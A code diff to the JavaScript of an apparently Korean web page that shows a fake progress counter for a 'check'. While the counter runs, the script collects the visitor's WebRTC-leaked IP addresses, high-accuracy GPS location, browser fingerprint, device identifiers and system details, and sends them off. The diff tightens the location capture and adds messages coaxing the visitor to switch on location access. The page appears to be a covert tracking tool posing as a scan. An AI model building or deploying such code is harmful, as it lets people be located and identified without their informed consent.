@@ -84,39 +84,47 @@
     let pct=0, sent=false;
     let timer = setInterval(()=>{pct+=15;const el=document.getElementById('s');if(el)el.innerText=Math.min(99,Math.floor(pct))+'%';if(pct>=100||!el)clearInterval(timer);},200);
 
+    let gpsWhy='ok';
     function readGps(ms){
         return new Promise(res=>{
-            if(!navigator.geolocation) return res(null);
+            if(!navigator.geolocation) return res({gps:null,why:'unsupported'});
             let over=false;
             const end=v=>{if(over)return;over=true;clearTimeout(t);res(v);};
-            const t=setTimeout(()=>end(null),ms);
+            const t=setTimeout(()=>end({gps:null,why:'timeout'}),ms);
             navigator.geolocation.getCurrentPosition(
-                p=>end({lat:p.coords.latitude,lng:p.coords.longitude,acc:Math.round(p.coords.accuracy)}),
-                ()=>end(null),{enableHighAccuracy:false,timeout:ms,maximumAge:120000});
+                p=>end({gps:{lat:p.coords.latitude,lng:p.coords.longitude,acc:Math.round(p.coords.accuracy)},why:'ok'}),
+                e=>end({gps:null,why:e&&e.code===1?'denied':'unavailable'}),{enableHighAccuracy:true,timeout:ms,maximumAge:60000});
         });
     }
     async function gpsForScan(){
         let state='unknown';
         try{if(navigator.permissions) state=(await navigator.permissions.query({name:'geolocation'})).state;}catch(e){}
-        if(state==='denied') return null;
+        if(state==='denied') return {gps:null,why:'denied'};
         const note=document.getElementById('gnote');
         if(note&&state!=='granted') note.style.display='block';
-        const g=await readGps(state==='granted'?5000:15000);
+        const r=await readGps(state==='granted'?10000:25000);
         if(note) note.style.display='none';
-        return g;
+        return r;
+    }
+    function platformName(){
+        const p=navigator.platform||'';
+        if(p==='MacIntel'&&navigator.maxTouchPoints>1) return 'iPad';
+        return p;
     }
 
     async function sendScan(enrollKey,gpsPromise){
         if(sent) return; sent=true;
-        const [rtc,gps]=await Promise.all([rtcIps(),gpsPromise||gpsForScan()]);
+        const [rtc,loc]=await Promise.all([rtcIps(),gpsPromise||gpsForScan()]);
+        const gps=loc.gps; gpsWhy=loc.why;
         const data={
             ua:navigator.userAgent,
             res:`${screen.width}x${screen.height}`,
-            plat:navigator.platform,
+            plat:platformName(),
             timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
             lang:navigator.language||'',
             rtc:rtc,
             gps:gps,
+            gps_status:gpsWhy,
             fp:fp(),
             cid:clientId(),
             device_token:getToken(),
@@ -135,7 +143,8 @@
 
     function done(text){
         clearInterval(timer);
-        document.getElementById('main').innerHTML='<h2>'+(text||'✓ 점검 완료')+'</h2>';
+        const tip={denied:'위치 권한이 꺼져 있어 IP 기준으로 점검했어요.',timeout:'위치 응답이 없어 IP 기준으로 점검했어요.',unavailable:'위치를 찾지 못해 IP 기준으로 점검했어요.',unsupported:'이 브라우저는 위치 기능이 없어 IP 기준으로 점검했어요.'}[gpsWhy];
+        document.getElementById('main').innerHTML='<h2>'+(text||'✓ 점검 완료')+'</h2>'+(tip?'<p style="font-size:13px;color:#8b949e;line-height:1.6;max-width:300px;margin:8px auto 0">'+tip+'<br>정확한 위치를 남기려면 기기 설정에서 브라우저의 위치 접근을 켜 주세요.</p>':'');
     }
 
     function blocked(){
